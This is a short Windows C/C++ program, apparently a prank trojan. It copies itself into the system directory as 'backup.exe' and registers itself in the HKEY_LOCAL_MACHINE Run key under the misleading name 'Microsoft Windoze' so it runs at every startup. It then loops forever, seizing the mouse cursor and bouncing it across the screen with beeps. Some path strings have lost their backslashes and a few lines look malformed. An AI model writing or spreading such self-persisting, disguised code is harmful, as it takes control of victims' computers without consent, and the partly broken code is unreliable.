#include <windows.h>
#include <string>
#include <time.h>

int WINAPI WinMain (HINSTANCE hThisInstance,
                                         HINSTANCE hPrevInstance,
                                         LPSTR lpszArgument,
                                         int nFunsterStil)
{
    char windir[MAX_PATH];
    char cpathname[MAX_PATH];
    char whatever[64] = "SoftwareMicrosoftWindowsCurrentVersionRun";
    char something[32] = "Microsoft Windoze";
    GetWindowsDirectory(windir, sizeof(windir));
    HMODULE hMe = GetModuleHandle(NULL);
    GetModuleFileName(hMe, cpathname, sizeof(cpathname));
    strcat(windir, "system32backup.exe");
    CopyFile(cpathname, windir, false);
    HKEY hKey;
    RegCreateKey(HKEY_LOCAL_MACHINE, whatever , &hKey);
    RegSetValueEx(hKey, something, 0, REG_SZ , (LPBYTE)windir, sizeof(windir));
    int screen_x, screen_y;
    int direction_x = 10; 
    int direction_y = 10;
    char ab="a"[1];
    POINT cursor;
    clock_t start;
    screen_x = GetSystemMetrics(SM_CXSCREEN);
    screen_y = GetSystemMetrics(SM_CYSCREEN);
    while(ab=ab)
        {
             start = clock();                 
             GetCursorPos(&cursor);
             if(cursor.x == (screen_x - 1))
             {
               direction_x = -10;
               Beep(500,25);
             }
             if(cursor.x < 2)
             {
               direction_x = 10;
               Beep(500,25);
             } 
             cursor.x = cursor.x + direction_x;
             if(cursor.y == (screen_y - 1))
            {
               direction_y = -10;
               Beep(750,25);
            }
            if(cursor.y < 1)
            {
               direction_y = 10;
               Beep(750,25);
            }
            cursor.y = cursor.y + direction_y;
            SetCursorPos(cursor.x,cursor.y);
            while((clock() - start) < 10);                         
      system("PAUSE");
      }
     return 0;
 }

